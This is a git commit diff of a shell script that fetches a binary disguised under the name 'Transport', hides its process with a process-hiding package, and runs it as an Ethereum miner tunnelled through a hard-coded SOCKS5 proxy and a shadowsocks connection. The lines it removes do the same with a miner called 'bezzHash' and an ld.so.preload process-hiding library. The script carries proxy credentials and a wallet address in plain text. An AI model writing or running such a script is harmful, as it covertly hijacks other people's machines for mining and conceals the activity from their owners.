b5b12030773407cbc49eb2daf9233563681563e8
renilo <88342640+renilo@users.noreply.github.com>
2022-04-04 18:51:16 +0700

    Update man.sh

--- man.sh
+++ man.sh
@@ -1,8 +1,13 @@
-#!/bin/sh
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -11,7 +16,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 44.202.124.0:1080
+socks5 = 52.203.46.122:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
@@ -20,29 +25,18 @@ END
 
 sleep .2
 
-echo " "
-echo " "
-
-echo "******************************************************************"
-
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo "******************************************************************"
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
+chmod +x Transport
 
-echo " "
-echo " "
+apt -y install shadowsocks-libev rng-tools
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
+ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+ph add Transport
 
-./graftcp/graftcp ./bezzHash --url=ssl://0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.bezzHash@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./Transport -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p x -w Transport --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
